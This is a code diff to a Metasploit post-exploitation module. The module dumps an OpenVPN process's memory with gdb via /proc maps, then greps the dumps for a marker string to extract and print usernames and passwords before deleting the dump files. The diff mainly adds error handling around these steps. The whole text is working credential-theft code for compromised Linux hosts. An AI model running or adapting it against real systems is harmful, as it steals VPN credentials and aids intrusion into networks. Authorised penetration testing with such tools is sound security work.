@@ -57,14 +57,23 @@ class Metasploit4 < Msf::Post
       return
     end
 
-    cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{tmp_path}#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done')
-    strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")
-    cmd_exec("/bin/rm #{tmp_path}*.dump --force")
-
-    if strings.empty?
-      print_error('No credentials. You can check if the PID is correct.')
-      return
+    dump = cmd_exec('/bin/grep rw-p /proc/'"#{pid}"'/maps | sed -n \'s/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '"#{pid}"' -ex "dump memory '"#{tmp_path}#{pid}"'-$start-$stop.dump 0x$start 0x$stop"; done 2>/dev/null; echo $?')
+    if dump.chomp.to_i == 0
+      vprint_good('Succesfully dump.')
+    else
+      print_warning('Could not dump process.')
     end
+
+    strings = cmd_exec("/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \"User: \"$1\"\\nPass: \"$2}'")
+
+    deldump = cmd_exec("/bin/rm #{tmp_path}*.dump --force 2>/dev/null; echo $?")
+    if deldump.chomp.to_i == 0
+      vprint_good('Removing temp files successfully.')
+    else
+      print_warning('Could not remove dumped files.')
+    end
+
+    fail_with(Failure::BadConfig, 'No credentials. You can check if the PID is correct.') if strings.empty?
 
     vprint_good("OpenVPN Credentials:\n#{strings}")
 
